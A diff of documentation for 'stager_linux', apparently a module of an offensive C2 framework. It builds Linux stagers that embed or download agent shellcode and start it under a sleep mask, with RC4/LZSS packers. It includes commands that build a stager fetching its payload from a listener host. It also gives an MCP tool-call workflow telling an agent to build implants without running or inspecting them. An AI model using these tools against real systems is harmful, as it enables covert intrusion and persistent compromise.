@@ -1,82 +1,47 @@
-# stager_linux
+# stager_linux internals
 
-Builds a Linux stager for a C agent PIC. The stager either embeds the PIC or
-downloads it from a payload listener at run time, then starts it under a sleep
-mask.
+`stager_linux` builds a Linux stager for a C agent PIC. Operator help is in the
+module manifest: `run_module` with `module=stager_linux`, or `module_help` over
+MCP.
 
-Run it from the operator console.
+## Source layout
 
-## Before you start
+- `stub.c`, `stager_pic.ld` — freestanding PIC entry and linker script.
+- `downloader.c`, `transport_http.c`, `transport_tcp.c`, `transport_udp.c`,
+  `transport_libcurl.c`, `transport_libssl.c`, `transport.h` — payload
+  download providers.
+- `mask.c`, `mask.h`, `mask_ranges.h`, `mask_xor.c` — sleep mask.
+- `unpack_stub_rc4.c`, `unpack_stub_lzss.c`, `unpack.h`, `lzss.h` — packed
+  shellcode unpackers.
+- `stager_state.c`, `state.h`, `supervise.h` — supervisor state.
+- `embed_payload.py`, `pack_common.py`, `pack_rc4.py`, `pack_lzss.py` — build
+  helpers.
+- `build.sh`, `Makefile`, `config.json` — build contract and module metadata.
 
-- Build the payload with `generate_c --cc <host> --format shellcode`.
-- For download mode, serve that `.bin` with `emp3r0r-listener` and use the same
-  `--payload-key` on both sides.
+## Build contract
 
-## MCP workflow
+`build.sh` parses the flags declared in `config.json` and invokes `make` with
+the resulting variables. Keep the parser, `Makefile`, and `config.json` in
+sync: the module runner forwards supplied flags only, and defaults live in all
+three places.
 
-An MCP session builds a Linux C agent with two tool calls:
+- `format=raw` is PIC shellcode for a loader; `packed` is self-unpacking
+  shellcode; `executable` is a linked ELF; `so` is a shared object.
+- Embed mode activates when `agent-pic` is set and ignores every `payload-*`
+  option. Download mode requires the listener options to match
+  `emp3r0r-listener`.
+- `unpacker` selects the RC4 or LZSS stub. Keep both stubs symmetric with the
+  packers; a mismatch yields a stager that downloads but never starts.
+- `dynload-mode` selects the glibc ABI (`public` for 2.34+, `libc_dl` for older
+  glibc). `hash-style` must match the target loader.
+- `supervise` requires a stager-built agent so identity survives restarts.
 
-1. `generate_c` with `type=glibc`, `arch=amd64`, `format=shellcode`. The result
-   carries `output_file` and `shellcode_file`.
-2. `run_module` with `module=stager_linux` and `agent-pic=<output_file>`, plus
-   `format` when the operator wants something other than the default.
+## Tests
 
-`raw` and `packed` are stager shellcode for a loader; `executable` is the
-runnable ELF; `so` is a shared library. In download mode, omit `agent-pic` and
-set `payload-host`, `payload-port`, `payload-path`, and `payload-key` to match
-`emp3r0r-listener`.
+`tests/` contains the stager lifecycle, packer, transport, C agent, sleep mask,
+and SOCKS5 end-to-end tests. `test/` holds the harness shared with the Go
+tests. Run them with `make -C core/modules/stager_linux test`, or the package
+test that covers the changed path.
 
-The build result is the verification. Do not execute the output, check
-listeners or ports, trace it, or read the C agent source on the operator host.
-
-## Usage
-
-```bash
-stager_linux [options]
-```
-
-Embed the payload, so the stager needs no download at run time:
-
-```bash
-stager_linux --format executable --agent-pic /path/to/agent.bin
-```
-
-Download the payload from a listener:
-
-```bash
-stager_linux --format executable --transport http --payload-host 203.0.113.10 --payload-port 8000 --payload-path / --payload-key 'shared-key'
-```
-
-Build a shared object or packed shellcode:
-
-```bash
-stager_linux --format so --agent-pic /path/to/agent.bin
-stager_linux --format packed --agent-pic /path/to/agent.bin --unpacker lzss
-```
-
-## Options
-
-| Option | Default | Use |
-| --- | --- | --- |
-| `--format` | `raw` | `so` shared library, `executable` ELF, `raw` shellcode, `packed` self-unpacking shellcode |
-| `--transport` | `http` | `http`, `tcp`, `udp`, `libcurl`, `libssl` |
-| `--agent-pic` | empty | Embed this C agent PIC; when set, the download options are ignored |
-| `--payload-host` | empty | Payload listener host |
-| `--payload-port` | `8000` | Payload listener port |
-| `--payload-path` | `/` | HTTP request path; HTTP transports only |
-| `--payload-key` | empty | Listener passphrase; must match the listener |
-| `--unpacker` | `rc4` | `packed` only: `rc4` or `lzss` |
-| `--dynload-mode` | `public` | `public` for glibc 2.34+, `libc_dl` for older glibc |
-| `--hash-style` | `auto` | `auto`, `sysv`, or `gnu` |
-| `--ech` | `off` | `libssl` only: `on` or `off` |
-| `--ech-config` | empty | `libssl` only: base64 ECHConfigList |
-| `--supervise` | `off` | Run the agent in a child process and keep its identity across restarts; requires a stager-built agent |
-| `--supervise-sleep-min` | `5` | Minimum supervisor sleep in seconds |
-| `--supervise-sleep-max` | `30` | Maximum supervisor sleep in seconds |
-
-Use `emp3r0r-listener --stager /path/to/agent.bin --port 8000 --key 'shared-key' --type http`
-to serve a download payload.
-
-The build prints the generated artifact path: `stager.bin` for `raw`,
-`stager` for `executable`, `stager.so` for `so`, or `stager-packed.bin` for
-`packed`.
+The build result is the deliverable. Do not execute it on the operator host;
+verify by inspecting the returned path and size.
